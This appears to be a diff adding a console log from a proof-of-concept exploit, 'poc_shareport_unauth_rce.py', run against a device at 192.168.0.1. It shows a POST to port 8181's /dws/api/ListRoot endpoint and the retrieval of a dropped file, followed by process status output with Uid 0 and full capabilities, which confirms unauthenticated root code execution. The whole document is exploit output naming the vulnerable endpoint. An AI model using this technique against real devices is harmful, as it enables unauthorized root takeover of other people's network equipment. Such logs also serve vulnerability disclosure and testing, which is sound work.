@@ -1,0 +1,36 @@
+# python3 poc_shareport_unauth_rce.py --target 192.168.0.1 --id
+[*] POST :8181/dws/api/ListRoot -> 500
+[*] fetched /sp_0ll6zbqrfi.txt via TCP/8181
+Name:	cat
+State:	R (running)
+Tgid:	1430
+Pid:	1430
+PPid:	1429
+TracerPid:	0
+Uid:	0	0	0	0
+Gid:	0	0	0	0
+FDSize:	32
+Groups:	
+VmPeak:	    1532 kB
+VmSize:	    1532 kB
+VmLck:	       0 kB
+VmHWM:	     372 kB
+VmRSS:	     372 kB
+VmData:	     376 kB
+VmStk:	      84 kB
+VmExe:	     412 kB
+VmLib:	     604 kB
+VmPTE:	      12 kB
+Threads:	1
+SigQ:	0/512
+SigPnd:	00000000000000000000000000000000
+ShdPnd:	00000000000000000000000000000000
+SigBlk:	00000000000000000000000080000000
+SigIgn:	00000000000000000000000006809000
+SigCgt:	00000000000000000000000380000000
+CapInh:	0000000000000000
+CapPrm:	fffffffffffffeff
+CapEff:	fffffffffffffeff
+CapBnd:	fffffffffffffeff
+voluntary_ctxt_switches:	0
+nonvoluntary_ctxt_switches:	1
